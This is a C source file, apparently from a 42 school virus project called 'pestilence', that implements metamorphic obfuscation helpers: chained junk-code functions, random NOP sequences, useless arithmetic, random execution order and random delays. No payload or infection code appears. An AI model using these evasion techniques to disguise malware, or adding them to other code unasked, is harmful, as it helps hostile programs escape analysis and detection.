/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   metamorph.c                                        :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: jainavas <jainavas@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/01/09 18:51:58 by jainavas          #+#    #+#             */
/*   Updated: 2026/01/09 22:17:40 by jainavas         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "../include/pestilence.h"

#include <time.h>

// Inicializar el generador aleatorio (llamar UNA vez)
void init_metamorph(void)
{
    static bool initialized = false;
    
    if (!initialized) {
        srand(time(NULL) ^ getpid());
        initialized = true;
    }
	pepino += 777;
	calculadoradepepino();
}

void insert_garbage2(void)
{
	insert_garbage4();
}

void insert_garbage3(void)
{
	insert_garbage5();
}

void insert_garbage4(void)
{
	insert_garbage();
}

void insert_garbage5(void)
{
	insert_garbage4();
}

// Insertar código basura aleatorio
void insert_garbage(void)
{
    int choice = rand() % 5;
    volatile int dummy;
    
    switch (choice) {
        case 0:
            // NOPs en assembly
            __asm__ volatile ("nop; nop; nop; nop;");
            break;
        
        case 1:
            // Operación matemática inútil
            dummy = rand() % 1000;
            dummy = dummy * 2 + 1;
            dummy = dummy / 2;
            break;
        
        case 2:
            // Loop vacío
            for (int i = 0; i < (rand() % 10); i++)
                __asm__ volatile ("nop;");
            break;
        
        case 3:
            // Comparación sin efecto
            if (rand() % 2 == 0)
                dummy = 1;
            else
                dummy = 1;
            break;
        
        case 4:
            // Llamada a función vacía
            dummy = getpid() ^ getpid();  // Siempre 0
            break;
    }
    
    // Prevenir que el compilador optimice
    (void)dummy;
}

// Decidir orden de operaciones
int get_execution_order(void)
{
    // Retorna un número de 0-3 que determina el orden de ejecución
    return rand() % 4;
}

// Delay aleatorio (muy corto, casi imperceptible)
void random_delay(void)
{
    volatile int i;
    int iterations = rand() % 100;
    
    for (i = 0; i < iterations; i++)
        __asm__ volatile ("nop;");
}
